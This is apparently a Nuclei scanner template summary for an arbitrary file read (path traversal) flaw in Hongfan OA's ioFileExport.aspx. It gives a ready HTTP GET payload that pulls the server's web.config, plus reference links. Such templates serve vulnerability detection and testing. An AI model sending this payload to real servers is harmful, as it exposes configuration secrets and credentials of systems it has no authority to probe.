# Nuclei Template: Hongfan OA ioFileExport.aspx - Arbitrary File Read
**Template ID:** hongfan-ioffice-lfi
**Vulnerability Class:** Path Traversal
**Severity:** Medium
**Source:** Nuclei Template (`hongfan-ioffice-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Arbitrary File Read vulnerability in the Hongfan OA ioFileExport.aspx file, through which an attacker can obtain sensitive server information

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename={{filename}}.txt&ContentType=application/octet-stream
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E7%BA%A2%E5%B8%86OA/%E7%BA%A2%E5%B8%86OA%20ioFileExport.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
- https://github.com/qingchenhh/qc_poc/blob/main/Goby/ioffice_file_read.go
